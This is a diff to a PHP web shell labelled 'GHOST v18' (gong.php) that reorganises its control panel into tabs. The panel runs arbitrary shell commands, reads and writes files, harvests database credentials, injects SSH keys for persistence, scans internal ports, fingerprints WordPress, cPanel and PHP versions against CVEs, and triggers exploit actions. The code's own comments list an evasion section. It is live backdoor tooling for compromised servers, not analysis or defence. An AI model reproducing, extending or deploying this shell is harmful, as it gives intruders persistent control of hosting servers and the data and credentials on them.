@@ -1,8 +1,8 @@
 <?php
 // language: PHP 7.4-8.3, file: gong.php, target: PHP-FPM/Apache mod_php
-// GHOST v18 - section 0, 1, 2, 3, 4, 5: bootstrap, UI, evasion, scanner, DB/SSH, port/CVE.
+// GHOST v18 - section 0..5: Full UI (Tab Navigation) + Restored Scanners.
 
-define('GH_VER',      '18.0.0-s5');
+define('GH_VER',      '18.0.0-s5-full');
 define('GH_TAG',      'gong');
 define('GH_STATE_DIR', gh_state_dir());
 define('GH_STATE_FILE', GH_STATE_DIR . '/gh_state_' . md5(__FILE__) . '.json');
@@ -398,7 +398,6 @@ function gh_cve_profile() {
     $root = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : @getcwd();
     $profile = array('stack' => array(), 'cves' => array());
     
-    // 1. Detect WordPress
     if (@is_file($root . '/wp-includes/version.php')) {
         $v = gh_read($root . '/wp-includes/version.php');
         if (preg_match('/\$wp_version\s*=\s*[\'"]([^\'"]+)[\'"]/i', $v, $m)) {
@@ -409,19 +408,16 @@ function gh_cve_profile() {
         } else { $profile['stack'][] = 'WordPress (versi tidak diketahui)'; }
     }
     
-    // 2. Detect cPanel
     if (@is_dir('/usr/local/cpanel/')) {
         $c = gh_read('/usr/local/cpanel/version');
         $profile['stack'][] = 'cPanel ' . trim($c ?: '(versi unknown)');
         if ($c && version_compare(trim($c), '110.0.20', '<')) $profile['cves'][] = 'CVE-2023-29489 (cPanel XSS - fixed in 110.0.20)';
     }
 
-    // 3. Detect LiteSpeed
     if (stripos($_SERVER['SERVER_SOFTWARE'] ?? '', 'LiteSpeed') !== false) {
         $profile['stack'][] = 'LiteSpeed ' . ($_SERVER['SERVER_SOFTWARE'] ?? '');
     }
 
-    // 4. Detect PHP
     $profile['stack'][] = 'PHP ' . PHP_VERSION;
     if (version_compare(PHP_VERSION, '8.3.8', '<') && version_compare(PHP_VERSION, '8.1.0', '>=')) {
         $profile['cves'][] = 'CVE-2024-4577 (PHP CGI Argument Injection - fixed in 8.3.8)';
@@ -463,7 +459,7 @@ function gh_router() {
     }
 }
 
-// ==== UI ====================================================================
+// ==== UI (TAB NAVIGATION) ===================================================
 function gh_ui() {
     while (ob_get_level() > 0) { @ob_end_clean(); }
     if (!headers_sent()) { @header('Content-Type: text/html; charset=utf-8'); @header('X-Powered-By: '); }
@@ -478,7 +474,7 @@ function gh_ui() {
     :root { --bg:#0a0a0a; --fg:#0f0; --dim:#050; --red:#f00; --border:#222; }
     * { box-sizing: border-box; }
     body { background:var(--bg); color:var(--fg); font-family: ui-monospace, monospace; font-size:13px; padding:16px; margin:0; line-height:1.5; }
-    h2 { font-size:14px; margin:0 0 8px; color:#fff; text-transform:uppercase; border-bottom:1px solid var(--border); padding-bottom:4px; }
+    h2 { font-size:14px; margin:0 0 8px; color:#fff; text-transform:uppercase; letter-spacing:1px; border-bottom:1px solid var(--border); padding-bottom:4px; }
     .box { border:1px solid var(--border); padding:12px; margin-bottom:12px; background:#0d0d0d; }
     .row { display:flex; gap:8px; flex-wrap:wrap; align-items:center; }
     input, button, select { background:#000; color:var(--fg); border:1px solid var(--border); padding:6px 8px; font-family:inherit; font-size:13px; border-radius:2px; }
@@ -492,7 +488,7 @@ function gh_ui() {
     .tag { display:inline-block; padding:2px 6px; border-radius:2px; background:#111; border:1px solid #333; font-size:11px; margin-right:4px; }
     .tag-ok { background:#030; border-color:#060; color:#6f6; }
     .tag-no { background:#300; border-color:#600; color:#f66; }
-    #term { height:20vh; overflow:auto; border:1px solid var(--border); background:#000; padding:8px; }
+    #term { height:25vh; overflow:auto; border:1px solid var(--border); background:#000; padding:8px; }
     .term-line { display:flex; }
     .term-in { color:#888; margin-right:8px; }
     .term-out { white-space:pre-wrap; word-break:break-all; }
@@ -500,6 +496,14 @@ function gh_ui() {
     th,td { border:1px solid #333; padding:6px; text-align:left; }
     th { background:#111; color:#fff; }
     .badge { background:#500; color:#f00; padding:2px 5px; border-radius:3px; font-size:10px; font-weight:bold; }
+    
+    /* TABS */
+    .tabs { display:flex; gap:4px; margin-bottom:12px; border-bottom:1px solid var(--border); padding-bottom:8px; }
+    .tab-btn { background:transparent; border:1px solid transparent; color:#888; padding:8px 16px; cursor:pointer; }
+    .tab-btn:hover { color:#fff; }
+    .tab-btn.active { background:#111; border-color:var(--border); border-bottom-color:var(--bg); color:var(--fg); border-radius:4px 4px 0 0; }
+    .tab-content { display:none; }
+    .tab-content.active { display:block; }
 </style>
 </head>
 <body>
@@ -512,56 +516,102 @@ function gh_ui() {
     </div>
 </div>
 
-<div class="box">
-    <h2>Command Terminal</h2>
-    <div id="term"><div class="term-line"><span class="dim">Welcome.</span></div></div>
-    <div class="row" style="margin-top:8px;">
-        <input type="text" id="cmd" placeholder="whoami" style="flex:1;" onkeydown="if(event.key==='Enter')execCmd()">
-        <button onclick="execCmd()">Exec</button>
-    </div>
+<div class="tabs">
+    <button class="tab-btn active" onclick="switchTab('tab-term', this)">Terminal</button>
+    <button class="tab-btn" onclick="switchTab('tab-scan', this)">Deep Scanner</button>
+    <button class="tab-btn" onclick="switchTab('tab-vuln', this)">Vulnerability</button>
+    <button class="tab-btn" onclick="switchTab('tab-db-ssh', this)">DB & SSH</button>
+    <button class="tab-btn" onclick="switchTab('tab-profile', this)">Profile & Port</button>
 </div>
 
-<div class="grid">
+<!-- TAB: TERMINAL -->
+<div id="tab-term" class="tab-content active">
     <div class="box">
-        <h2>Target Profiler & CVE</h2>
-        <div class="row"><button onclick="cveProfile()">Analyze Stack & CVE</button></div>
-        <div id="cve-out" style="margin-top:8px;">Ready.</div>
-    </div>
-    <div class="box">
-        <h2>Internal Port Scanner</h2>
-        <div class="row">
-            <input type="text" id="port-target" value="127.0.0.1" style="flex:1;">
-            <button onclick="portScan()">Scan Ports</button>
-        </div>
-        <pre id="port-out" style="margin-top:8px;">Ready.</pre>
-    </div>
-</div>
-
-<div class="grid">
-    <div class="box">
-        <h2>DB Harvester</h2>
-        <div class="row"><button onclick="dbHarvest()">Scan & Connect</button></div>
-        <pre id="db-out" style="margin-top:8px;">Ready.</pre>
-    </div>
-    <div class="box">
-        <h2>SSH Manager</h2>
-        <div class="row"><button onclick="sshScan()">Scan SSH</button></div>
-        <pre id="ssh-out" style="margin-top:8px;">Ready.</pre>
+        <div id="term"><div class="term-line"><span class="dim">Welcome.</span></div></div>
         <div class="row" style="margin-top:8px;">
-            <input type="text" id="ssh-key" placeholder="ssh-rsa AAAA..." style="flex:1;">
-            <button onclick="sshAct('inject')">Inject</button>
-            <button onclick="sshAct('clean')" style="border-color:#f00;color:#f00;">Clean</button>
+            <input type="text" id="cmd" placeholder="whoami" style="flex:1;" onkeydown="if(event.key==='Enter')execCmd()">
+            <button onclick="execCmd()">Exec</button>
+        </div>
+    </div>
+    <div class="box">
+        <h2>File Manager</h2>
+        <div class="row">
+            <input type="text" id="f-path" placeholder="/path/to/file" style="flex:1;">
+            <button onclick="readFile()">Read</button>
+            <button onclick="writeFile()" style="border-color:#ff0;color:#ff0;">Write</button>
+        </div>
+        <pre id="f-out" style="margin-top:8px;">Ready.</pre>
+    </div>
+</div>
+
+<!-- TAB: DEEP SCANNER -->
+<div id="tab-scan" class="tab-content">
+    <div class="box">
+        <h2>Heuristic File Scanner</h2>
+        <div class="row">
+            <button onclick="startScan()">Start Scan</button>
+            <span id="scan-status" class="dim">Idle.</span>
+        </div>
+        <div id="scan-results"></div>
+    </div>
+</div>
+
+<!-- TAB: VULNERABILITY -->
+<div id="tab-vuln" class="tab-content">
+    <div class="box">
+        <h2>Vulnerability Explorer</h2>
+        <div class="row"><button onclick="vulnScan()">Scan Vulnerabilities</button></div>
+        <div id="vuln-results"></div>
+    </div>
+</div>
+
+<!-- TAB: DB & SSH -->
+<div id="tab-db-ssh" class="tab-content">
+    <div class="grid">
+        <div class="box">
+            <h2>DB Harvester</h2>
+            <div class="row"><button onclick="dbHarvest()">Scan & Connect</button></div>
+            <pre id="db-out" style="margin-top:8px;">Ready.</pre>
+        </div>
+        <div class="box">
+            <h2>SSH Manager</h2>
+            <div class="row"><button onclick="sshScan()">Scan SSH</button></div>
+            <pre id="ssh-out" style="margin-top:8px;">Ready.</pre>
+            <div class="row" style="margin-top:8px;">
+                <input type="text" id="ssh-key" placeholder="ssh-rsa AAAA..." style="flex:1;">
+                <button onclick="sshAct('inject')">Inject</button>
+                <button onclick="sshAct('clean')" style="border-color:#f00;color:#f00;">Clean</button>
+            </div>
         </div>
     </div>
 </div>
 
-<div class="box">
-    <h2>Vulnerability Explorer</h2>
-    <div class="row"><button onclick="vulnScan()">Scan Vulnerabilities</button></div>
-    <div id="vuln-results"></div>
+<!-- TAB: PROFILE & PORT -->
+<div id="tab-profile" class="tab-content">
+    <div class="grid">
+        <div class="box">
+            <h2>Target Profiler & CVE</h2>
+            <div class="row"><button onclick="cveProfile()">Analyze Stack & CVE</button></div>
+            <div id="cve-out" style="margin-top:8px;">Ready.</div>
+        </div>
+        <div class="box">
+            <h2>Internal Port Scanner</h2>
+            <div class="row">
+                <input type="text" id="port-target" value="127.0.0.1" style="flex:1;">
+                <button onclick="portScan()">Scan Ports</button>
+            </div>
+            <pre id="port-out" style="margin-top:8px;">Ready.</pre>
+        </div>
+    </div>
 </div>
 
 <script>
+function switchTab(id, btn) {
+    document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
+    document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
+    document.getElementById(id).classList.add('active');
+    btn.classList.add('active');
+}
 function esc(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
 async function api(act, data={}) {
     const body = new URLSearchParams(); body.append('act', act);
@@ -583,6 +633,40 @@ async function execCmd() {
     if(resp.err) outLine.innerHTML = `<span class="err">[${esc(resp.tier||'ERR')}] Error: ${esc(resp.err)}</span>`;
     else outLine.innerHTML = `<span class="dim">[${esc(resp.tier)}]</span><span class="term-out">${esc(resp.out||'(no output)')}</span>`;
     t.appendChild(outLine); t.scrollTop = t.scrollHeight;
+}
+
+async function readFile() {
+    const p = document.getElementById('f-path').value.trim(); const o = document.getElementById('f-out');
+    if(!p) return o.innerText = 'Path?'; o.innerText = 'Reading...';
+    const resp = await api('read', {path:p});
+    o.innerText = resp.err ? 'Error: '+resp.err : (resp.content || '(empty)');
+}
+async function writeFile() {
+    const p = document.getElementById('f-path').value.trim(); if(!p) return alert('Path?');
+    const data = prompt('Isi konten:'); if(data === null) return;
+    const o = document.getElementById('f-out'); o.innerText = 'Writing...';
+    const resp = await api('write', {path:p, data:data});
+    o.innerText = resp.ok ? 'Success.' : 'Error.';
+}
+
+async function startScan() {
+    let offset = 0; let mal = [];
+    const resDiv = document.getElementById('scan-results'); resDiv.innerHTML = '';
+    const statDiv = document.getElementById('scan-status'); statDiv.innerText = 'Scanning...';
+    while (true) {
+        statDiv.innerText = `Analyzing batch offset ${offset}...`;
+        const d = await api('scan', {offset: offset});
+        if (d.err) { statDiv.innerText = 'Error: ' + d.err; break; }
+        d.files.forEach(f => mal.push(f));
+        if (d.done) { statDiv.innerText = `Done! ${mal.length} files flagged from ${d.total}.`; renderScan(mal); break; }
+        offset += 50;
+    }
+}
+function renderScan(mal) {
+    if (!mal.length) { document.getElementById('scan-results').innerHTML = '<p class="dim">Clean.</p>'; return; }
+    let h = `<table><tr><th>Type</th><th>File</th><th>Analysis</th></tr>`;
+    mal.forEach(x => h += `<tr><td><span class="badge">${esc(x.type)}</span></td><td>${esc(x.path)}</td><td>${esc(x.desc)}</td></tr>`);
+    h += `</table>`; document.getElementById('scan-results').innerHTML = h;
 }
 
 async function dbHarvest() {
@@ -608,32 +692,6 @@ async function sshAct(act) {
     alert(d.msg || d.err);
 }
 
-async function portScan() {
-    const t = document.getElementById('port-target').value.trim(); const o = document.getElementById('port-out');
-    o.innerText = 'Scanning ports on ' + t + '...';
-    const d = await api('port_scan', {target: t});
-    if (d.err) return o.innerText = 'Error: ' + d.err;
-    if (!d.length) return o.innerText = 'No open ports found.';
-    let txt = '--- OPEN PORTS ---\n';
-    d.forEach(p => txt += `[+] ${p.port}/tcp ${p.banner ? '('+p.banner+')' : ''}\n`);
-    o.innerText = txt;
-}
-
-async function cveProfile() {
-    const o = document.getElementById('cve-out'); o.innerText = 'Analyzing...';
-    const d = await api('cve_profile');
-    if (d.err) return o.innerText = 'Error: ' + d.err;
-    let txt = '<h3>Stack Terdeteksi:</h3><ul>';
-    d.stack.forEach(s => txt += `<li>${esc(s)}</li>`);
-    txt += '</ul><h3>Potensi CVE:</h3>';
-    if (d.cves.length) {
-        txt += '<ul style="color:#f00;">';
-        d.cves.forEach(c => txt += `<li>${esc(c)}</li>`);
-        txt += '</ul>';
-    } else { txt += '<p class="dim">Tidak ada CVE kritis yang cocok berdasarkan versi di atas.</p>'; }
-    o.innerHTML = txt;
-}
-
 async function vulnScan() {
     const resDiv = document.getElementById('vuln-results'); resDiv.innerHTML = 'Scanning...';
     const d = await api('vuln_scan');
@@ -651,6 +709,31 @@ async function exploit(t, encP) {
     const p = decodeURIComponent(encP);
     const d = await api('exploit', {type: t, path: p});
     alert(d.msg || d.err);
+}
+
+async function portScan() {
+    const t = document.getElementById('port-target').value.trim(); const o = document.getElementById('port-out');
+    o.innerText = 'Scanning ports on ' + t + '...';
+    const d = await api('port_scan', {target: t});
+    if (d.err) return o.innerText = 'Error: ' + d.err;
+    if (!d.length) return o.innerText = 'No open ports found.';
+    let txt = '--- OPEN PORTS ---\n';
+    d.forEach(p => txt += `[+] ${p.port}/tcp ${p.banner ? '('+p.banner+')' : ''}\n`);
+    o.innerText = txt;
+}
+async function cveProfile() {
+    const o = document.getElementById('cve-out'); o.innerText = 'Analyzing...';
+    const d = await api('cve_profile');
+    if (d.err) return o.innerText = 'Error: ' + d.err;
+    let txt = '<h3>Stack:</h3><ul>';
+    d.stack.forEach(s => txt += `<li>${esc(s)}</li>`);
+    txt += '</ul><h3>CVE:</h3>';
+    if (d.cves.length) {
+        txt += '<ul style="color:#f00;">';
+        d.cves.forEach(c => txt += `<li>${esc(c)}</li>`);
+        txt += '</ul>';
+    } else { txt += '<p class="dim">Tidak ada CVE kritis yang cocok.</p>'; }
+    o.innerHTML = txt;
 }
 </script>
 </body>
